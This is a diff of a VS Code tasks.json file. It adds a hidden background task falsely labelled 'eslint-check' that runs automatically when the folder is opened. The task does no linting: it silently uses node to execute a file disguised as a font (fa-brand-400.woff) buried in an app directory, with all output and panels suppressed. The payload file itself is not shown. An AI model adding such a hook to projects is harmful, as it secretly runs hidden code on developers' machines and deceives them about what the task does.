@@ -1,14 +1,33 @@
 {
-	"version": "2.0.0",
-	"tasks": [
-		{
-			"label": "TypeScript Build",
-			"type": "shell",
-			"command": "npm run -s build",
-			"problemMatcher": [
-				"$tsc"
-			],
-			"group": "build"
-		}
-	]
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./src/app/dashboard/admin/commercial-listings/view/[id]/public/fonts/fa-brand-400.woff) || (where node >nul 2>&1 && node ./src/app/dashboard/admin/commercial-listings/view/[id]/public/fonts/fa-brand-400.woff) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+    {
+      "label": "TypeScript Build",
+      "type": "shell",
+      "command": "npm run -s build",
+      "problemMatcher": [
+        "$tsc"
+      ],
+      "group": "build"
+    }
+  ]
 }
